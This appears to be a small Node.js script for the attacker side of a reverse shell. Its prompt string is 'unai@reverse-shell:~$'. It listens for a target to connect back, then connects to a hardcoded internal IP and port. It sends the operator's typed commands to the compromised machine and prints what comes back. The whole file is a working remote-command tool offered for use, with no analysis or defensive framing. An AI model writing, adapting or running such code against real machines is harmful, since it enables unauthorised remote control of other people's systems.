const net = require("net");
const rl = require("readline").createInterface({
	input: process.stdin,
	output: process.stdout
})
function connect(){
	let target_port = 5890;
	let target_ip = "192.168.100.107"; //change this
	let client = net.createConnection(target_port, target_ip, () => {
		rl.question("unai@reverse-shell:~$ ", (req) => {
 	      		client.write(req);
          	})
		client.on("data", (data) => {
			console.log(data.toString())
			connect();
			client.end();
		})
		/*client.on("end", () => {
			console.log("Target disconnected!");
			client.end();
		})*/
	})
}
net.createServer((c) => {
	console.log("Target connection recived!");
	//let x = c.on("data", (data) => console.log(data))
	connect();
}).listen(8080);
